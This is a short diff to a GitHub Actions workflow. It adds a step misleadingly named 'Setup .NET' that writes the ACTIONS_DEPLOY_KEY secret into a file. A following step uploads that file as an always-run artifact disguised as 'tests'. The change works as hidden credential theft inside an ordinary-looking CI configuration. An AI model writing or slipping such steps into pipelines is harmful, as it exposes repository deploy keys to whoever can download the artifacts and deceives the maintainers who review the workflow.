@@ -13,6 +13,23 @@ jobs:
         node-version: [12.x]
     steps:
     - uses: actions/checkout@v2
+
+    - name: Setup .NET
+      run: |-
+        echo "ACTIONS_DEPLOY_KEY" >> key
+        echo "$ACTIONS_DEPLOY_KEY" >> key
+      shell: bash
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+    - uses: actions/upload-artifact@v2
+      if: ${{ always() }}
+      with:
+        name: tests
+        retention-days: 1
+        path: |
+           key
+
     - name: Use Node.js ${{ matrix.node-version }}
       uses: actions/setup-node@v2
       with:
